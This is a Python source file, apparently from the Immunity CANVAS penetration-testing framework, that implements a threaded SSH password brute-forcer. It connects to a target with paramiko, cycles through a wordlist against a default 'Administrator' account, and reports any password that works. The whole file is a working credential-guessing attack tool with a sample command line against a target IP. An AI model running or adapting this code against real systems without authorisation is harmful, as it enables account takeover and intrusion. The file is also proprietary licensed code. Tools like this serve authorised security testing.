#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import socket
import time

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit

NAME='SSH bruteforcer'
DESCRIPTION='Threaded SSH password bruteforcer'

DOCUMENTATION={}
DOCUMENTATION['References']=''
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION["Notes"]="""
This is a simple ssh brute forcer. With full_close set to true (default) it will be gracious and slowly close the connection.
With full_close set to False (or zero), it will run as fast as it can, but this causes false negatives.

"""
DOCUMENTATION["Commandline"]="exploits/ssh_brute/ssh_brute.py -t 10.10.10.207 -O user:user -O full_close:0"

VERSION='0.1'

PROPERTY={}
PROPERTY['TYPE']='Tools'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']

NOTES=""" 
"""

CHANGELOG="""
"""
import libs.paramiko as paramiko

from threading import *
class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)        
        self.name=NAME
        self.port=22
        self.filename='/usr/share/dict/words'
        self.user='Administrator'
        self.mylock=RLock()
        self.threadcount=5
        self.found_password=None 
        self.full_close=True 
        self.connections_failing=False 
        return

    def getArgs(self):
        self.host=self.target.interface
        self.user=self.argsDict.get('user',self.user)
        self.filename=self.argsDict.get('filename',self.filename)
        self.port=self.argsDict.get('port',self.port)
        self.full_close=int(self.getarg("full_close"))
        self.threadcount=int(self.getarg("threadcount"))
        return
    
    def getNextPassword(self):
        """
        Only one thread at a time can get a password from the file
        """
        while 1:
            try:
                password=self.fd.readline()
                if password=="":
                    self.no_more_passwords=True 
                    break 
                #remove trailing \n
                password=password.strip()
                self.log("New password: %s"%password)
            except IOError:
                break
            yield password

        return
    
    def run_in_thread(self):
        """
        Each thread makes connections and tries passwords
        """
        password="A"
        #six is default so we do one less
        max_tries_per_connect=5
        
        no_more_passwords=False 
        while password!=None or self.done == False:
            if self.state==self.HALT:
                self.log("Thread halting.")
                return 
            
            if self.done:
                break 
            

            sock=self.gettcpsock()
            try:
                sock.connect((self.host, self.port))
            except socket.error:
                self.log("Failed to connect to %s:%d"%(self.host, self.port))
                self.log("Ending this thread.")
                self.connections_failing=True 
                return 

            t = paramiko.Transport(sock)
            try:
                t.connect()
            except paramiko.SSHException, msg:
                self.log("%s is not the password: %s"%(password, msg))
                if "Error reading SSH protocol" in str(msg):
                    self.log("Connection has been overwhelmed (or is not SSH!)")
                    t.close()
                    del t
                    self.log("Thread sleeping to let server recover")
                    #you have to sleep for an ungodly time here.
                    time.sleep(120)
                    continue
                
            for i in xrange(0,max_tries_per_connect):
                self.mylock.acquire()
                try:
                    password=self.passwords.next()
                except StopIteration:
                    no_more_passwords=True 
                self.mylock.release()
                if no_more_passwords:
                    self.done = True
                    return 
                
                try:
                    self.log("Trying %s:%s"%(self.user, password))
                    t.auth_password(username=self.user, password=password)
                    #we got a "Bad auth" message from the server
                except paramiko.SSHException, msg:
                    self.log("SSH Exception: %s"%msg)
                else:
                    self.log("Found password: %s"%password)
                    self.found_password=password
                    self.done=True
                    if self.full_close:
                        t.close()
                    else:
                        del t
                        
                    return

            if self.full_close:
                #this is slow
                t.close()
            else:
                #this is fast but on Ubuntu gives you false negatives
                del t 

        return 

    def test(self):
        self.getArgs()
        self.log('%s running against %s:%s covertness: %d'%(NAME,self.host,self.port,self.covertness))
        self.setInfo('%s attacking %s:%s (Covertness:%d) - running'%(NAME,self.host,self.port,self.covertness))
      

    def run(self):
        self.getArgs()
        self.no_more_passwords=False
        self.done=False 
        self.log('%s running against %s:%d covertness: %d'%(NAME,self.host,self.port,self.covertness))
        self.setInfo('%s attacking %s:%d (Covertness:%d) - running'%(NAME,self.host,self.port,self.covertness))
        self.log("Brute forcing user: %s with password file %s"%(self.user, self.filename))
        self.passwords=self.getNextPassword()
        self.fd=file(self.filename,"rb")
        if self.full_close:
            self.log("Using slow close method")
        else:
            self.log("Using fast but less accurate close method")
        self.log("Spawning %d threads..."%self.threadcount)
        for i in xrange(self.threadcount):
            r=Thread(target=self.run_in_thread)
            r.start()

        self.log("Spawned %d threads"%self.threadcount)
        # thread wait
        while self.done != True:
            time.sleep(1)
        self.log("Closing open sockets")
        time.sleep(5)
        if self.found_password!=None:
            self.log("Found working password: %s"%self.found_password)
            self.setInfo('%s attacking %s:%d (Covertness:%d) - done (found:%s:%s)'%(NAME,self.host,self.port,self.covertness,self.user,self.found_password))
            return 1
        self.log("Did not find the password")
        self.setInfo('%s attacking %s:%d (Covertness:%d) - done (failed)'%(NAME,self.host,self.port,self.covertness))
        return 0        

    def usage(self):
        print 'Usage: %s -t host -p port [-U user -P password] [-O filename:/usr/share/dict/cracklib-small] -O threadcount:5 -O full_close:0 [-C covertness]'%(sys.argv[0])
        

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
